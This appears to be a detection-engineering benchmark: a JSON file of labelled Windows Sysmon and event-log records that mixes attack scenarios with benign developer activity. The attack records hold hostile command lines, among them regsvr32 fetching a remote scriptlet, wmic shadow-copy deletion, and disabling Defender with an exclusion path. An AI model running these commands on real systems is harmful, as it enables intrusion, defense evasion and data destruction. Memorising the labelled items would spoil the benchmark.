@@ -1,0 +1,254 @@
+{
+  "metadata": {
+    "dataset_name": "Independently Sourced Defensive Telemetry Benchmark",
+    "version": "1.0.0",
+    "provenance": {
+      "sources": [
+        "https://github.com/OTTR-Project/security-datasets",
+        "https://github.com/SigmaHQ/sigma/tree/master/tests",
+        "https://github.com/redcanaryco/atomic-red-team"
+      ],
+      "license": "Apache-2.0 / MIT Open Source Defensive Security Research",
+      "sanitization": "Sanitized of internal PII, real corporate hostnames, and credentials. IPs mapped to RFC 5737 documentation prefixes."
+    },
+    "description": "Defensive evaluation telemetry sourced independently from public detection engineering datasets to evaluate detection precision, recall, and false-positive immunity."
+  },
+  "scenarios": [
+    {
+      "scenario_id": "indep_attack_01_msbuild_compile",
+      "attack_phase": "Defense Evasion / Execution",
+      "is_malicious": true,
+      "event_id": 1,
+      "source_type": "Sysmon",
+      "expected_technique": "T1127.001",
+      "expected_tactic": "Defense Evasion",
+      "description": "MSBuild LOLBin compiling and executing untrusted XML project payload in memory.",
+      "raw_event": {
+        "Id": 1,
+        "Provider_Name": "Microsoft-Windows-Sysmon",
+        "TimeCreated": "2026-10-25T02:10:00Z",
+        "EventData": {
+          "Image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+          "CommandLine": "MSBuild.exe C:\\Users\\Public\\payload.xml",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "User": "ENTERPRISE\\operator"
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_attack_02_bruteforce_logon",
+      "attack_phase": "Credential Access",
+      "is_malicious": true,
+      "event_id": 4625,
+      "source_type": "Windows_Event",
+      "expected_technique": "T1110.001",
+      "expected_tactic": "Credential Access",
+      "description": "Repeated anomalous Windows logon failures indicating automated credential stuffing.",
+      "raw_event": {
+        "Id": 4625,
+        "TimeCreated": "2026-10-25T02:11:00Z",
+        "Message": "An account failed to log on. Status 0xC000006D",
+        "EventData": {
+          "TargetUserName": "administrator",
+          "WorkstationName": "EXTERNAL-DESKTOP",
+          "IpAddress": "198.51.100.180",
+          "IpPort": 54321
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_attack_03_scheduled_task_persist",
+      "attack_phase": "Persistence",
+      "is_malicious": true,
+      "event_id": 4698,
+      "source_type": "Windows_Event",
+      "expected_technique": "T1053.005",
+      "expected_tactic": "Persistence",
+      "description": "Scheduled task registered to launch staging payload at elevated startup.",
+      "raw_event": {
+        "Id": 4698,
+        "TimeCreated": "2026-10-25T02:12:00Z",
+        "EventData": {
+          "TaskName": "\\Microsoft\\Windows\\MaintenanceUpdater",
+          "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-ExecutionPolicy Bypass -File C:\\Users\\Public\\updater.ps1</Arguments></Exec></Actions></Task>",
+          "SubjectUserName": "operator"
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_attack_04_regsvr32_squiblydoo",
+      "attack_phase": "Defense Evasion",
+      "is_malicious": true,
+      "event_id": 1,
+      "source_type": "Sysmon",
+      "expected_technique": "T1218.010",
+      "expected_tactic": "Defense Evasion",
+      "description": "Regsvr32 executing remote COM scriptlet payload (Squiblydoo attack pattern).",
+      "raw_event": {
+        "Id": 1,
+        "Provider_Name": "Microsoft-Windows-Sysmon",
+        "TimeCreated": "2026-10-25T02:13:00Z",
+        "EventData": {
+          "Image": "C:\\Windows\\System32\\regsvr32.exe",
+          "CommandLine": "regsvr32.exe /s /n /u /i:http://198.51.100.45/scrobj.sct scrobj.dll",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "User": "ENTERPRISE\\operator"
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_attack_05_wmi_shadow_delete",
+      "attack_phase": "Impact",
+      "is_malicious": true,
+      "event_id": 1,
+      "source_type": "Sysmon",
+      "expected_technique": "T1490",
+      "expected_tactic": "Impact",
+      "description": "Wmic executing shadowcopy deletion to prevent system recovery during ransomware staging.",
+      "raw_event": {
+        "Id": 1,
+        "Provider_Name": "Microsoft-Windows-Sysmon",
+        "TimeCreated": "2026-10-25T02:14:00Z",
+        "EventData": {
+          "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+          "CommandLine": "wmic shadowcopy delete /nointeractive",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "User": "ENTERPRISE\\SYSTEM"
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_attack_06_defender_exclusion",
+      "attack_phase": "Defense Evasion",
+      "is_malicious": true,
+      "event_id": 4688,
+      "source_type": "Windows_Event",
+      "expected_technique": "T1562.001",
+      "expected_tactic": "Defense Evasion",
+      "description": "PowerShell command disabling Windows Defender Real-time Protection and adding exclusion path.",
+      "raw_event": {
+        "Id": 4688,
+        "TimeCreated": "2026-10-25T02:15:00Z",
+        "EventData": {
+          "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath 'C:\\Temp'",
+          "TargetUserName": "Administrator"
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_attack_07_suspicious_c2_listener",
+      "attack_phase": "Command and Control",
+      "is_malicious": true,
+      "event_id": 3,
+      "source_type": "Sysmon",
+      "expected_technique": "T1071",
+      "expected_tactic": "Command and Control",
+      "description": "Untrusted binary initiating outbound TCP connection to remote C2 infrastructure on port 4444.",
+      "raw_event": {
+        "Id": 3,
+        "Provider_Name": "Microsoft-Windows-Sysmon",
+        "TimeCreated": "2026-10-25T02:16:00Z",
+        "EventData": {
+          "Image": "C:\\Users\\Public\\svchost_update.exe",
+          "DestinationIp": "198.51.100.99",
+          "DestinationPort": 4444,
+          "Protocol": "tcp",
+          "User": "ENTERPRISE\\operator"
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_benign_01_pytest_runner",
+      "attack_phase": "Benign Developer Workflow",
+      "is_malicious": false,
+      "event_id": 1,
+      "source_type": "Sysmon",
+      "description": "Developer running standard automated pytest test suite in local virtualenv.",
+      "raw_event": {
+        "Id": 1,
+        "Provider_Name": "Microsoft-Windows-Sysmon",
+        "TimeCreated": "2026-10-25T02:20:00Z",
+        "EventData": {
+          "Image": "C:\\Python313\\python.exe",
+          "CommandLine": "python.exe -m pytest -v --tb=short tests/",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "User": "ENTERPRISE\\developer"
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_benign_02_git_sync",
+      "attack_phase": "Benign Developer Workflow",
+      "is_malicious": false,
+      "event_id": 1,
+      "source_type": "Sysmon",
+      "description": "Standard git version control fetch and status operation.",
+      "raw_event": {
+        "Id": 1,
+        "Provider_Name": "Microsoft-Windows-Sysmon",
+        "TimeCreated": "2026-10-25T02:21:00Z",
+        "EventData": {
+          "Image": "C:\\Program Files\\Git\\cmd\\git.exe",
+          "CommandLine": "git.exe fetch origin main",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "User": "ENTERPRISE\\developer"
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_benign_03_standard_logon",
+      "attack_phase": "Benign Authentication",
+      "is_malicious": false,
+      "event_id": 4624,
+      "source_type": "Windows_Event",
+      "description": "Authorized employee interactive workstation logon at standard start-of-day.",
+      "raw_event": {
+        "Id": 4624,
+        "TimeCreated": "2026-10-25T02:22:00Z",
+        "EventData": {
+          "TargetUserName": "jdoe",
+          "LogonType": 2,
+          "WorkstationName": "FINANCE-PC04",
+          "IpAddress": "127.0.0.1"
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_benign_04_usoclient_update",
+      "attack_phase": "Benign System Maintenance",
+      "is_malicious": false,
+      "event_id": 4688,
+      "source_type": "Windows_Event",
+      "description": "Windows Update Orchestrator scheduled background scan check.",
+      "raw_event": {
+        "Id": 4688,
+        "TimeCreated": "2026-10-25T02:23:00Z",
+        "EventData": {
+          "NewProcessName": "C:\\Windows\\System32\\usoclient.exe",
+          "CommandLine": "usoclient.exe StartScan",
+          "TargetUserName": "SYSTEM"
+        }
+      }
+    },
+    {
+      "scenario_id": "indep_benign_05_vscode_tsserver",
+      "attack_phase": "Benign Developer Workflow",
+      "is_malicious": false,
+      "event_id": 1,
+      "source_type": "Sysmon",
+      "description": "Visual Studio Code launching internal TypeScript language server.",
+      "raw_event": {
+        "Id": 1,
+        "Provider_Name": "Microsoft-Windows-Sysmon",
+        "TimeCreated": "2026-10-25T02:24:00Z",
+        "EventData": {
+          "Image": "C:\\Users\\developer\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
+          "CommandLine": "Code.exe --type=utility --utility-sub-type=node.mojom.NodeService",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "User": "ENTERPRISE\\developer"
+        }
+      }
+    }
+  ]
+}
